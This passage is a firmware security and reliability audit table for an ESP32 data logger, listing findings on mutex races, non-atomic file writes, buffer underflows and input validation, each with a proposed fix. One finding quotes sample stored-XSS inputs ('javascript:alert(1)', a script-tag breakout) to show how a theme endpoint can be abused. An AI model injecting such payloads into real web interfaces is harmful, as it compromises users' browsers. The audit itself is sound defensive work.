| 8.2 | H | StorageManager.cpp:91-123 `generateDatalogFileOptions` — builds raw `<option>` HTML by concatenating `fullPath` with no HTML-escaping. Filename containing `"`, `<`, `>`, `&`, or `'` breaks markup or injects script. **Dead code today** (no callers — verified via grep) but linked into firmware and still re-enabled by legacy paths. | Delete `generateDatalogFileOptions` + `countDatalogFiles` from `.cpp/.h` (also dead). Or escape via `htmlEscape()` helper. | Fixed (#92) |
| 8.3 | M | StorageManager.cpp:91-152 — `std::vector<String> dirs` recursion stack uncapped. Same OOM risk as Utils.cpp `deleteRecursive` (7.4). | Cap recursion depth via `if (dirs.size() > 256) break;`. | Pending |
| 8.4 | M | StorageManager.cpp:85-89 `getStorageBarColor` — declared/defined, **no callers** (grep clean). Dead. | Delete from `.cpp/.h`. | Pending |
| 8.5 | H | RtcManager.cpp:36-67 `initRtc` — calls `Rtc->SetIsWriteProtected(false)` at line 36 but **never re-enables write protection** at the end of init. RTC stays writable forever; any code path with `Rtc->SetDateTime` is unguarded against accidental writes (compare to WebServer.cpp:1316 RAII guard in `/set_time`). | After RTC init success, `Rtc->SetIsWriteProtected(true);`. WiFiManager.cpp:179-186 and `/set_time` already wrap their writes in unprotect/write/protect cycles. | Pending |
| 8.6 | H | RtcManager.cpp:78-80 `backupBootCount` — opens `/bootcount.bin` in `"w"` (truncate) mode and writes raw 4 bytes. NO atomic write (no `.tmp` + rename). Power loss mid-write = empty or 1-3 byte file. Next `restoreBootCount` reads truncated bytes → corrupt counter. | Mirror saveConfig pattern: write to `/bootcount.tmp`, fsync via close, `LittleFS.rename(tmp, BOOTCOUNT_BACKUP_FILE)`. | Fixed (#78) |
| 8.7 | M | RtcManager.cpp:93-96 `restoreBootCount` — discards `f.read()` return value. On short file (truncated by 8.6 power-loss scenario), partial overwrite of `bootCount`; remaining bytes keep old stack/BSS state. | `size_t n = f.read(...); if (n != sizeof(bootCount)) bootCount = 0;` | Pending |
| 8.8 | M | RtcManager.cpp:71-80 `backupBootCount` — does not acquire `fsMutex` despite writing LittleFS. Race vs `saveConfig` (already taking it) and `StorageTask.appendRow`. | `if (fsMutex && xSemaphoreTake(fsMutex, pdMS_TO_TICKS(2000)) == pdTRUE) { ...; xSemaphoreGive(fsMutex); }`. | Pending |
| 8.9 | L | RtcManager.cpp:212-215 — ESP32/S2/S3 EXT1 wake path silently `return` when wakeupMode != ACTIVE_HIGH. User configures ACTIVE_LOW → device never wakes from GPIO. No status reported. | Set `statusMessage = "EXT1 wake requires ACTIVE_HIGH on this chip"` so the UI surfaces it. | Pending |
| 8.10 | M | RtcManager.cpp:53-56 — 3-iter retry loop calls `delay(10) + delay(10) + delay(100) = 120ms` per iteration × 3 = up to 360ms during `initRtc`. Runs BEFORE OtaManager::boot (ESP_Logger.ino:543). If a pending-verify image hangs here, rollback watchdog never arms. Tied to 1.14. | Move OtaManager::boot earlier (before initHardware/initRtc) per 1.14, OR add a heartbeat write inside the retry loop. | Pending |
| 8.11 | I | HardwareManager.cpp:26 — `ISR_DEBOUNCE_MICROS=1000` caps pulse rate at 1000 Hz ≈ 133 L/min for YF-S201 (450 pulses/L). Adequate for residential but undocumented. | Add `// Caps max measurable flow at ~133 L/min for YF-S201, ~100 L/min for YF-S403` comment near ISR. | Pending |
| 8.12 | I | RtcManager.cpp:30-33 — `new ThreeWire(...)` and `new RtcDS1302(...)` without `std::nothrow`. Bad_alloc on heap-pressured boot aborts. | `new(std::nothrow)`; on failure set `rtcValid=false; return;`. | Pending |
| 8.13 | I | HardwareManager.h / StorageManager.h / RtcManager.h / WiFiManager.h — trivial declarations; risk surface is in the corresponding .cpp files. | [MODULE SAFE for headers] | N/A |

---

## Phase 9 — Config / OTA / DataLog Managers

Files: `managers/ConfigManager.*`, `managers/OtaManager.*`, `managers/DataLogger.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 9.1 | M | ConfigManager.cpp:40-46 — `if (config.datalog.maxEntries == 0)` resets FIVE unrelated fields (maxEntries, includeBootCount, includeExtraPresses, postCorrectionEnabled, timestampFilename). User cannot validly set maxEntries=0 to disable rotation without losing other settings. | Split into per-field zero checks; or use a dedicated `if (!datalog_initialised)` magic flag. | Pending |
| 9.2 | M | ConfigManager.cpp:119, 137 — `isRtcWakePinC3` and `isSafePinC3` hardcoded for ESP32-C3 pin ranges (≤5 for wake, !=11..17 for safe). ESP32-S3/S2 builds get false-invalid verdicts and reset to wrong defaults. | Gate via `#if CONFIG_IDF_TARGET_ESP32C3 ... #elif CONFIG_IDF_TARGET_ESP32S3 ...` with per-target pin tables. | Pending |
| 9.3 | H | ConfigManager.cpp:441-449 — Migration path copies header preamble (`magic`..`resetBootCountAction`) byte-for-byte via `memcpy(&config, rawBuf, headerSize)` with NO per-field version guard. If a pre-v6 binary had different layout (no `_reserved_lang` byte, different field order), every subsequent byte is shifted. SAFE_COPY's partial-copy branch can also leave strings non-NUL-terminated. No tests for cross-version migration. | Add per-version offset tables; for unrecognised pre-v6 layout, refuse to migrate and reset to defaults. Verify via fuzz tests of older config blobs. | Fixed (#92) |
| 9.4 | M | ConfigManager.cpp:194 `regenerateDeviceId` — bypasses fsMutex (same as 1.8), no CSRF on the API surface (4.x), and produces a deviceId change without reboot → external API consumers cache stale id. | Acquire fsMutex; require explicit user-initiated regen flow that warns about stale caches; bump a `deviceIdGeneration` counter clients can watch. | Pending |
| 9.5 | L | ConfigManager.cpp:352 `migrateConfig` ends with `saveConfig()` during setup() before fsMutex exists. Today benign (single-threaded). If migrate is ever called outside setup, race. | Add comment "migrate must run pre-task-init". | Pending |
| 9.6 | I | ConfigManager.cpp:21-113 `applyDefaults` long sequential `if !strlen()/badFloat()` chain. Maintainability concern only. | Split into per-section helper functions. | Pending |
| 9.7 | M | DataLogger.cpp:12-21 `countFileLines` — reads entire log byte-by-byte BEFORE every flush (called from line 69). O(file-size) per flush. On a 1 MB log, every cycle re-reads 1 MB. | Cache line count in RTC RAM or compute incrementally; only re-scan after rotation. | Pending |
| 9.8 | H | DataLogger.cpp:50-51 `trimLogFile` — `fs->remove(path); fs->rename(tmpPath, path);` is non-atomic. Power loss in the gap leaves NEITHER file present, losing the entire datalog history. Contrast with ConfigManager/ModuleRegistry which use rename-over-existing. | LittleFS rename overwrites atomically — drop the `remove` and just `rename(tmpPath, path)`. | Fixed (#78) |
| 9.9 | M | DataLogger.cpp:73 `flushLogBufferToFS` — opens FILE_APPEND without fsMutex. Called from loop() AND from `/flush_logs` (AsyncTCP worker, WebServer.cpp:1364). Race vs StorageTask.appendRow, saveConfig, RtcManager.backupBootCount (8.8). | Acquire fsMutex (timeout 2000ms); return false on timeout so caller can retry. | Fixed (#79) |
| 9.10 | L | DataLogger.cpp:60-65 — `folder` directory created without isPathProtected check. Malicious or careless config can target `/_setup` etc. | Validate against isPathProtected before mkdir; reject save_datalog with 400 if invalid. | Pending |
| 9.11 | L | DataLogger.cpp:174-180 — When `logBufferCount >= LOG_BATCH_SIZE` and flush failed, silently shifts array dropping oldest entry. No counter, no log. RTC slow memory backup loses data unobserved. | Increment a `g_logDrops` counter; expose via `/api/diag`. | Pending |
| 9.12 | M | OtaManager.cpp:25-34 `_logOtaEvent` — writes `/reset_log.txt` without fsMutex. Races against StorageTask, saveConfig, datalog flush. | Same fix family as 9.9 / 8.8 — acquire fsMutex. | Fixed (#79) |
| 9.13 | L | OtaManager.cpp:114-128 `confirm()` — failure is permanent. Subsequent `tick()` calls keep retrying `esp_ota_mark_app_valid_cancel_rollback` every loop iteration, wasting CPU. | After first confirm failure, set `s_confirmFailed = true` and skip retries; log once. | Pending |
| 9.14 | L | OtaManager.cpp:132-148 `rollback()` — `esp_ota_mark_app_invalid_rollback_and_reboot` does NOT verify target partition has a valid image. If both slots corrupt, device bricks on reboot. Standard ESP-IDF behavior; out of scope of this firmware but worth documenting. | Pre-validate target via `esp_ota_get_state_partition(prev, &state)` before invoking rollback. | Pending |
| 9.15 | I | ConfigManager.h / OtaManager.h / DataLogger.h — trivial declarations. | [MODULE SAFE for headers] | N/A |

---

## Phase 10 — FreeRTOS Sensor Tasks

Files: `tasks/TaskManager.h`, `tasks/SensorTask.*`, `tasks/SlowSensorTask.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 10.1 | M | SensorTask.cpp:13 — `uint32_t pollMs = sensorManager.minReadIntervalMs();` fetched ONCE at task start. `/api/config/platform` reload mutates sensor intervals but SensorTask's local `pollMs` stays stale forever → reads lag (or run too fast) until reboot. | Re-read `minReadIntervalMs()` inside the loop, OR signal task via task-notification when reload happens. | Pending |
| 10.2 | M | SensorTask.cpp:13, 32 — If `sensorManager.count()==0` or `minReadIntervalMs()` returns 0, `vTaskDelay(pdMS_TO_TICKS(0))` becomes a yield-only busy-loop. Empty sensor config → 100% CPU on SensorTask + cache-thrashes the C4 watchdog clock. | Clamp: `if (pollMs < 50) pollMs = 50;` after the call; verify SensorManager guarantees a floor. | Fixed (#85) |
| 10.3 | L | SensorTask.cpp:28, SlowSensorTask.cpp:25 — fallback `ts = millis()/1000` returns 0 for the first second of uptime. SensorTypes.h:21 reserves `ts=0` as "unknown" and LiveAggregator uses `_lastFlushEpoch==0` as "first call" sentinel. Collision during first 1 s after boot. | Bump: `ts = (millis()/1000UL) + 1;` to avoid 0 in the fallback path. | Pending |
| 10.4 | L | SlowSensorTask.cpp:31 — Hardcoded 500 ms outer poll. Not configurable, not data-driven. For SDS011 with 60-90 s internal cycles, 180 wakeups per useful read. Minor energy waste. | Compute from slow-sensor min interval, or expose a setup.h macro `SLOW_SENSOR_TICK_MS`. | Pending |
| 10.5 | L | SlowSensorTask.cpp:28 — Blocking sensor read (1.5-3 s for SDS011/PMS5003) runs WITHOUT refreshing `g_taskHeartbeat[TASK_IDX_SLOW_SENSOR]`. Current MAX_SILENCE_MS=30 s tolerates it; any future tightening would false-trip C4 watchdog. | Refresh heartbeat halfway through blocking reads via callback from the plugin, OR raise MAX_SILENCE_MS comment-doc. | Pending |
| 10.6 | M | TaskManager.h:30-34 — `static TaskHandle_t hSensor/hSlowSensor/hProcess/hStorage/hExport` declared PUBLIC. Any TU can write `TaskManager::hSensor = nullptr` and silently break `checkHealth`/diagnostics. | Make private; expose via `static TaskHandle_t getHandle(TaskIndex)` accessor. | Pending |
| 10.7 | M | TaskManager.h:36 — `static volatile bool running;` — volatile gives no-cache but no cross-task memory ordering. Tasks may observe stale `running==true` for several cycles after main sets false → late shutdown. | `static std::atomic<bool> running;` with `running.store(false, std::memory_order_release)` on shutdown. | Pending |
| 10.8 | M | TaskManager.h:25 / TaskManager.cpp:193 — `checkHealth()` inspects heartbeat staleness only. A crashed task's heartbeat byte holds whatever it last wrote; 30 s pass before watchdog fires. | Add fast path: `if (handle && eTaskGetState(handle) == eDeleted) return false;` before heartbeat check. | Pending |
| 10.9 | I | SensorTask.cpp:30 — passes `sensorQueue` directly to `sensorManager.tickFiltered`; manager iterates sensor table without configMutex (already 3.19 / will revisit Phase 15). | See 3.19. | Pending |
| 10.10 | I | TaskManager.h / SensorTask.h / SlowSensorTask.h — header surface is small; principal risk in `.cpp` (already covered Phase 2 + this phase). | [MODULE SAFE for headers] | N/A |

---

## Phase 11 — FreeRTOS Pipeline Tasks

Files: `tasks/ProcessingTask.*`, `tasks/StorageTask.*`, `tasks/ExportTask.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 11.1 | M | ProcessingTask.cpp:14-26 — `isPlausible()` only validates temperature/humidity/pressure/pm25/pm10/tvoc/eco2/flow_rate/wind_speed. Missing entirely: voltage, current, uv_index, lux/light, distance, soil_moisture, AND `co2` (SCD4x emits `co2`, not `eco2`). Catch-all `return true` at L25 means these never get QUALITY_ERROR flagged. | Add per-metric bounds for every metric a registered plugin emits; reject by default (`return false`) for unknown metrics; log unknown-metric exactly once. | Pending |
| 11.2 | L | ProcessingTask.cpp:17 — Pressure bounds 500..1200 assume `hPa`. A plugin emitting Pa (101325) is silently rejected. SensorReading has no unit-aware validator. | Either canonicalise units at plugin level OR include unit in the plausibility key. | Pending |
| 11.3 | M | ProcessingTask.cpp:42-51 — `webRingBuf.push(r)` runs even when `r.quality == QUALITY_ERROR`. UI dashboard displays error values mixed with good data. | Guard: `if (r.quality != QUALITY_ERROR && webDataMutex && xSemaphoreTake(...)) { push; give; }`. | Pending |
| 11.4 | M | ProcessingTask.cpp:57 — `alertEngine.evaluate(r, r.timestamp)` passes timestamp which can be 0 (SensorTask fallback, see 10.3). AlertEngine.Rule.condFirstMetTs=0 collides with that → first trigger at ts=0 makes second reading at ts=1 elapse "1 s" → false short-duration trigger. | Skip evaluate when `r.timestamp < 1000000000` (no real wall-clock); also ensure SensorTask never emits ts=0 (tied to 10.3 +1 fix). | Pending |
| 11.5 | M | StorageTask.cpp:32-33 — `StorageTaskParam cfg = p ? *p : StorageTaskParam{};` copies params at task start. `/api/config/platform` reload of logger.* fields doesn't propagate (csvLoggingEnabled, aggregationIntervalSec, humidityCorrection, kappa). Same staleness class as 10.1. | Re-read from `*p` once per outer loop iteration, or signal task via task-notification on reload. | Pending |
| 11.6 | H | StorageTask.cpp:91-95 — Inner drain loop `while (xQueueReceive(...100ms) == pdTRUE)` can run for many seconds under sustained sensor burst. Each iteration blocks up to 100 ms; with continuous input the loop never falls through. Outer-loop heartbeat at L84 thus never refreshes → C4 watchdog (30 s) fires under legitimate high-throughput conditions. | Cap inner drain: `int drained = 0; while (... && drained++ < 32) ...;` then fall through every outer iteration. Or refresh heartbeat inside the inner loop. | Fixed (#90) |
| 11.7 | L | StorageTask.cpp:91 — `feedEpoch = nowEpochSafe()` computed ONCE before the drain loop. All items in a multi-second burst share the same timestamp regardless of arrival order. FlowRunLogger duration accounting blurred. | Compute per-item inside the loop, or use the SensorReading's own `r.timestamp` where valid. | Pending |
| 11.8 | H | ExportTask.cpp:31, 42 — `exportManager.sendAll(batch, batchCount)` blocks on TLS/HTTP/MQTT. With 5 enabled exporters × ~30 s socket timeout = up to 150 s blocked. ExportTask heartbeat at L22 only refreshes between iterations → C4 watchdog (30 s) false-positive restart during WiFi outages. | Refresh heartbeat between exporters inside sendAll (callback hook); or use a per-exporter shorter timeout (5 s). | Fixed (#90) |
| 11.9 | L | ExportTask.cpp:38-45 — Two flush paths (full-batch at L29-34 + batchFull/timeout at L38-44) are correct but slightly redundant. Maintenance footgun. | Consolidate into one decision-point after L35. | Pending |
| 11.10 | I | ProcessingTask.h / StorageTask.h / ExportTask.h — trivial declarations or POD struct (StorageTaskParam). | [MODULE SAFE for headers] | N/A |

---

## Phase 12 — Pipeline Core

Files: `pipeline/DataPipeline.h`, `pipeline/AggregationEngine.*`, `pipeline/LiveAggregator.*`, `pipeline/FlowRunLogger.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 12.1 | H | AggregationEngine.cpp:49 — `size_t avgLen = nextBucketEnd - nextBucketStart;` underflows to huge size_t if `nextBucketEnd < nextBucketStart` after the clamp at L45 (`if (nextBucketEnd >= inLen) nextBucketEnd = inLen - 1`). When `nextBucketStart > inLen-1`, the subtraction wraps → loop at L50 iterates billions of times → device freezes. Triggerable via `/api/data?limit=N` with N close to inLen. | Add guard: `if (nextBucketEnd < nextBucketStart) continue;` BEFORE L49. Same guard for L67's `for (j = rangeStart; j < rangeEnd; ...)` loop. | Fixed (#93) |
| 12.2 | H | AggregationEngine.cpp:67 — `for (size_t j = rangeStart; j < rangeEnd; j++)` — `rangeStart = i*bucketSize + 1`, `rangeEnd = nextBucketStart`. On the last LTTB iteration these can invert, causing same underflow as 12.1. | Cap iteration: `for (size_t j = rangeStart; j < rangeEnd && j < inLen; j++)`. | Fixed (#93) |
| 12.3 | M | AggregationEngine.cpp:37 — `bucketSize = (double)(inLen - 2) / (double)(maxPoints - 2);` — divide-by-zero when `maxPoints == 2`. Subsequent cast `(size_t)(INF * x)` is UB. Earlier guard catches maxPoints==1 only. | Add `if (maxPoints <= 2) { out[0]=in[0]; if (maxPoints==2) out[1]=in[inLen-1]; return maxPoints; }`. | Pending |
| 12.4 | M | AggregationEngine.cpp:210 — `tmpBuf = new SensorReading[tmpSz];` without `std::nothrow`. Heap-pressured `/api/data` request → bad_alloc → abort. Inconsistent with line 213 fallback assumption. | `tmpBuf = new(std::nothrow) SensorReading[tmpSz];` (the fallback path already handles nullptr). | Pending |
| 12.5 | L | AggregationEngine.cpp:213 — On LTTB tmpBuf alloc failure, silently degrades to AGG_AVG. Caller has no signal. | Set a flag or return a sentinel count; surface via response header `X-Agg-Degraded: 1`. | Pending |
| 12.6 | M | LiveAggregator.cpp:122-125 — `if (strcmp(r.metric, "humidity") == 0) _lastHumidity = r.value;` ignores sensorType. Multi-zone deployment: SCD4x humidity in zone A overwrites BME280 humidity that was meant to correct SDS011 PM in zone B. Wrong kappa correction. | Match (sensorType, sensorId) tuple OR use BME-family only; document the policy. | Pending |
| 12.7 | M | LiveAggregator.cpp:202 — `if (nowEpoch < _lastFlushEpoch + _intervalSec) return false;` — If NTP correction moves epoch BACKWARD (e.g. local RTC was 1 day ahead, NTP rebases), no flush will EVER trigger again until reboot. | Use monotonic millis()-based parallel clock; flush when either threshold passes. Also detect epoch backwards jump > 60s and reset `_lastFlushEpoch = nowEpoch`. | Pending |
| 12.8 | L | LiveAggregator.cpp:27-34 — `xSemaphoreCreateMutex()` failure leaves `_mutex == nullptr`; the `Lock` helper at .cpp:19 treats null as "OK", silently running unsynchronised. Multi-task safety lost without indication. | Refuse to construct or set a hard-error flag; expose `isHealthy()`. | Fixed (#79) |
| 12.9 | M | FlowRunLogger.cpp:130-131 — `volume = _volumeLatest - _volumeStart;` — when no volume reading was received before run start, `_volumeStart=0` (per L98 default), but `_volumeLatest` may hold a cumulative counter accumulated since boot → first run reports a wildly inflated volume. | Track a "has-seen-volume-since-run-start" bool; if false at close, mark volume column as empty rather than computing a bogus delta. | Pending |
| 12.10 | M | FlowRunLogger.cpp:156-179 — File write opens/appends/closes WITHOUT fsMutex. Race vs StorageTask.appendRow, ConfigManager.saveConfig, DataLogger.flush. Same fsMutex-bypass family as 8.8, 9.9, 9.12. | Acquire fsMutex (with timeout) around the open/write/close block. | Pending |
| 12.11 | M | FlowRunLogger.cpp:60-66 `_enforceSizeRotation` — `_fs->remove(bak); _fs->rename(path, bak);` non-atomic; power loss in the gap deletes the original. Same class as 9.8. | LittleFS rename overwrites atomically — drop the explicit remove. | Fixed (#78) |
| 12.12 | H | DataPipeline.h:47-56 RingBuffer::push — ordering: writes `_buf[h%N] = r` (L49), advances `_tail` (L53) with relaxed memory order BEFORE the data write completes, THEN publishes `_head` with release (L55). A concurrent reader observing the new tail (relaxed load) while the writer is mid-`memcpy` of the slot can read a torn 72-byte SensorReading. Risk grows on dual-core targets (S3); single-core C3 + FreeRTOS preemption between L49 and L55 also exposes it. | Reorder: 1) `_buf[h%N] = r;` 2) `_head.store(newH, release);` 3) update _tail under separate cas/release if needed. OR: writer ALWAYS takes webDataMutex (drop the try-take pattern in ProcessingTask:48). | Fixed (#90) |
| 12.13 | M | DataPipeline.h:65-72, 86-95 — `copyRecent` / `findLast` / `collectMetricSeries` perform 72-byte memcpy of slots while a concurrent push may overwrite. Per-slot sequence-number guard would let readers retry on torn reads. | Add `std::atomic<uint32_t> _seq[N];` incremented before+after each slot write; reader retries when even/odd parity mismatches. | Pending |
| 12.14 | L | DataPipeline.h:134-135 — comment says "200 entries ≈ 14KB" but actual sizeof(SensorReading) ≈ 72 B → 14.4 KB. Comment correct enough; flag for future-proofing once SensorReading grows. | Replace magic with `WEB_RING_SIZE = (16*1024) / sizeof(SensorReading)`. | Pending |
| 12.15 | I | AggregationEngine.h / LiveAggregator.h / FlowRunLogger.h / DataPipeline.h — interface surfaces; principal risk in `.cpp`. Trivial declarations otherwise. | [MODULE SAFE for headers beyond previously-flagged items] | N/A |

---

## Phase 13 — IModule Adapters (Network / OTA / Theme)

Files: `modules/WiFiModule.*`, `modules/OtaModule.*`, `modules/ThemeModule.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 13.1 | M | WiFiModule.cpp:8-16 `parseIPv4` — leaves `out[]` untouched on malformed input. User POSTs `{"staticIP":"junk"}` → save returns success, value unchanged. Silent acceptance: UI shows save-success but underlying field never updated. | Return bool; caller (load()) propagates as validation failure → IModule.h:42 contract. Explicit `if (a < 0 \|\| a > 255 \|\| ...)` instead of the bitwise-OR trick at L12. | Pending |
| 13.2 | M | WiFiModule.cpp:42-57 + ThemeModule.cpp:36-53 — `load()` always returns `true` regardless of validation outcome. Out-of-range enums, malformed strings, invalid IPs all silently accepted. IModule.h:42 validation contract unused. Compounds with ModuleRegistry.cpp:78 which discards load() return anyway (already 6.12). | Per field: return false on parse failure; aggregate to caller. Fix 6.12 in tandem so registry honours it. | Pending |
| 13.3 | L | WiFiModule.cpp:44 — `n.wifiMode = (WiFiModeType)(cfg["wifiMode"] | (int)n.wifiMode);` — no range check on enum. User can set wifiMode=99; downstream code falls into AP-mode fallback without user-visible signal. | Validate `int v; if (v == 0 || v == 1) n.wifiMode = (WiFiModeType)v; else return false;`. | Fixed (#85) |
| 13.4 | L | WiFiModule.cpp:70-73 — `String(buf)` per IP × 4 = four short-lived heap allocations per save(). ArduinoJson v7 accepts `const char*` directly without the String wrapper. | `cfg["staticIP"] = (const char*)buf;` style — but careful with buffer lifetime; the assignment must happen before `buf` is reused for the next IP. Use a 4-row stack array of buffers. | Pending |
| 13.5 | M | OtaModule + IModule default `_enabled=true` — OTA "enabled" toggle has no semantic effect (no `start()` / `stop()` implementation). UI displays a switch that does nothing; user toggling it sets the boolean in modules.json but nothing in the firmware reads it. | Either implement `start()` to actually arm/disarm OTA route registration, OR override `isEnabled()` to always return true and `setEnabled()` as no-op. | Pending |
| 13.6 | L | OtaModule.cpp:11-18 — `save()` writes live status (running partition, pendingVerify, rollbackCapable) into modules.json on every saveConfig(). State churn pollutes the shadow file; LittleFS rewrites the file even when no user-config actually changed. | Move informational fields out of `save()`; expose them via `/api/modules/ota` GET only (via toDetailJson hook). | Pending |
| 13.7 | H | ThemeModule.cpp:36-53 — Color and path fields (primaryColor, …, lightBgColor, logoSource[129], faviconPath[33], chartLocalPath) accept ANY string with NO validation. A POST `/api/modules/theme` with `{"primaryColor":"javascript:alert(1)"}` or `{"logoSource":"\"><script>...</script>"}` is stored verbatim. Combined with `/export_settings` round-trip back to the UI, stored XSS if the UI ever uses innerHTML/style with the raw value. Defense-in-depth gap. | Validate: color fields must match `^#[0-9a-fA-F]{6}$`; logoSource must be relative path or http(s):// URL; reject `javascript:`/`data:text/html` URIs. | Fixed (#92) |
| 13.8 | M | ThemeModule.cpp — load/save covers only ~13 of ~20 theme fields. **Missing: ffColor, pfColor, otherColor, storageBarColor, storageBar70Color, storageBar90Color, storageBarBorder, boardDiagramPath.** `/api/modules/theme` cannot edit them while `/save_theme` can. Two endpoints diverge on the same struct. | Add missing fields to both schema string AND load/save; OR delete them from ThemeConfig if truly unused. | Pending |
| 13.9 | L | ThemeModule.cpp:38-41 — enum casts (mode, chartSource, chartLabelFormat) with no range check. `mode=99` stored verbatim → unknown enum value in switch statements downstream. | Validate against known enum values. | Pending |
| 13.10 | L | modules.json shadow vs config.bin precedence — config.bin is authoritative; modules.json shadow rewritten on every saveConfig(). If user manually edits /config/modules.json via /upload, next save silently overwrites. No documented precedence model surfaced to user; restore-from-modules.json path doesn't exist. | Document the model in INSTRUCTIONS.md / settings UI; OR implement two-way sync where modules.json edits trigger config.bin update. | Pending |
| 13.11 | I | WiFiModule.h / OtaModule.h / ThemeModule.h — trivial declarations + Meyers singletons. | [MODULE SAFE for headers] | N/A |

---

## Phase 14 — IModule Adapters (DataLog / Time) + Serial Provisioner

Files: `modules/DataLogModule.*`, `modules/TimeModule.*`, `serial/SerialProvisioner.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 14.1 | M | DataLogModule.cpp:50-71 — `load()` always returns true; same 13.2 family. Out-of-range enums, unbounded numerics, NaN floats silently accepted. | Per-field validation; return false on any rejection; aggregate via ModuleRegistry honouring load() return (tied to 6.12). | Pending |
| 14.2 | M | DataLogModule.cpp:55 — `rotation` enum cast without range check. ROTATION_SIZE=4 is max; `99` stored verbatim, then downstream switch defaults. | Validate against enum range 0..4. | Fixed (#85) |
| 14.3 | L | DataLogModule.cpp:62-65 — Four uint8_t enum fields (dateFormat/timeFormat/endFormat/volumeFormat) cast from int with no range check. | Validate each against schema option count. | Fixed (#85) |
| 14.4 | M | DataLogModule.cpp:52-53 — `folder` accepted without `isPathProtected` check. User can POST `{"folder":"_setup"}` via /api/modules/datalog; DataLogger.cpp:60-65 then mkdirs the protected path. Tied to 9.10. | Validate folder against `isPathProtected` and `sanitizePath` on load. | Pending |
| 14.5 | L | DataLogModule.cpp:68-69 — `pfToFfThreshold`/`ffToPfThreshold` accept NaN/Inf via JSON. `applyDefaults` catches at next saveConfig but JSON-direct path bypasses validation. | Add `isfinite()` check; reject or clamp to [0.1, 1000]. | Fixed (#85) |
| 14.6 | L | TimeModule.cpp:22-23 — narrowing cast `(int8_t)(cfg[...] | ...)` truncates out-of-range silently. Schema says timezone -12..+14 but JSON `99` is stored as `99` (int8_t holds), then later wraps on math. | Range-check before cast. | Fixed (#85) |
| 14.7 | M | SerialProvisioner.cpp:144 — `WiFi.begin(ssid, pass)` writes credentials to ESP32 NVS by default. NVS persists across reboots INDEPENDENT of config.bin. Two sources of truth diverge. After `/factory_reset` wipes LittleFS, NVS creds still auto-connect on next boot. | Either `WiFi.persistent(false)` before begin(), OR mirror NVS writes into `config.network.client*` and saveConfig. | Pending |
| 14.8 | M | SerialProvisioner.cpp:134-179 — On successful connect, does NOT update `config.network.clientSSID/clientPassword`. Device runs on NVS creds while config.bin shows stale values; `/export_settings` returns wrong network info; UI confused. | After WL_CONNECTED, write back to config and saveConfig(). | Pending |
| 14.9 | M | SerialProvisioner.cpp:93 — `WiFi.scanNetworks(false, ...)` BLOCKING for 2-4 s. `tick()` runs from main loop (ESP_Logger.ino:745). Blocks OtaManager::tick (90s OTA confirm window can be eaten), SSE publishLiveEvent, all main-loop tickers, watchdog refresh. | Use async scan (`scanNetworks(true)`), poll `scanComplete()` across multiple ticks. | Pending |
| 14.10 | M | SerialProvisioner.cpp + ApiHandlers.cpp:618-647 wifiTestTaskFn — both invoke `WiFi.begin`/`WiFi.mode` without coordination. Concurrent serial-connect + web-wifi-test → undefined radio state, can disconnect the AP serving the request. | Add a single `g_wifiOpInFlight` flag; reject concurrent ops with 409. | Pending |
| 14.11 | L | SerialProvisioner.cpp:33-35 — Overflow path silently resets buffer; no error response. Host has no signal that a long command was truncated. | Emit `{"ok":false,"err":"line_too_long"}` then reset. | Pending |
| 14.12 | L | SerialProvisioner runs unconditionally every loop iteration (ESP_Logger.ino:745) on every boot — even in deployed devices with USB plugged into a power adapter. Extra UART/USB-CDC attack surface (physical-access required, but any access can drive WiFi mode changes). | Gate via `setup.h` macro `SERIAL_PROVISIONER_ENABLED` (off by default in non-dev builds). | Pending |
| 14.13 | I | DataLogModule.h / TimeModule.h / SerialProvisioner.h — trivial declarations + Meyers singletons. | [MODULE SAFE for headers] | N/A |

---

## Phase 15 — Sensor Framework & Alerts

Files: `sensors/ISensor.h`, `sensors/SensorManager.*`, `alerts/AlertEngine.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 15.1 | L | ISensor.h:11-22 `CalibrationAxis::load` — no validation that `scale != 0` or `!isnan(offset/scale)`. User config `{"scale":0}` produces constant `offset` for every reading; `{"scale":"NaN"}` poisons every read. | Reject scale==0 and non-finite values; fall back to defaults. | Fixed (#85) |
| 15.2 | I | ISensor.h:90 `setId` — `strncpy(_id, id, sizeof(_id)-1)` relies on `_id[]` being zero-initialised by the protected default-init (`char _id[17] = {}`). Safe today; brittle if subclass adds custom ctor that skips the brace-init. | Add an explicit `_id[sizeof(_id)-1] = '\0';` after strncpy. | Pending |
| 15.3 | H | SensorManager.cpp:39 + 195-197 — `reloadConfig` calls `_destroyAll()` (frees `_sensors[]`) while SensorTask iterates the same array WITHOUT configMutex on the reader side. Use-after-free on the freed plugin pointers. Restates 3.19 with the producer-side context. | Acquire configMutex around `tickFiltered` body; OR signal a quiesce flag SensorTask honours before destroyAll. | Fixed (#90) |
| 15.4 | M | SensorManager.cpp:126-128 — `wireMutex` acquire with 100 ms timeout; on failure `tookMutex=false` and code PROCEEDS to `s->readAll()` WITHOUT lock. Silent fallback to unlocked I2C bus → bus contention with concurrent plugins. | On mutex timeout, skip this sensor's read for the tick; increment a `g_busSkips` counter. | Fixed (#79) |
| 15.5 | L | SensorManager.cpp:74 — `if (!sensor["enabled"]) continue;` defaults to FALSE when the JSON key is missing. User omitting `enabled` silently disables the sensor. | Default to true: `bool en = sensor["enabled"] \| true;`. | Pending |
| 15.6 | M | SensorManager.cpp:281 + 326-364 — `toJson` builds the per-sensor skeleton BEFORE taking webDataMutex; if mutex acquire fails (50 ms timeout), function early-returns leaving rules + skeleton fields populated but `last_values`/`spark`/`health` blocks missing. UI receives a partial response with no error signal. | On mutex-take failure, emit `o["partial"] = true` per sensor so UI can flag stale data. | Pending |
| 15.7 | M | AlertEngine.cpp:139 — `evaluate` uses `xSemaphoreTake(_mutex, 0)` (non-blocking). On contention with toJson/fromJson/snooze, evaluation is SILENTLY SKIPPED. Sensor readings during web-API activity miss alert checks; no counter exposed. | Use short timeout (5 ms) and increment `g_alertEvalDrops` on failure. | Fixed (#79) |
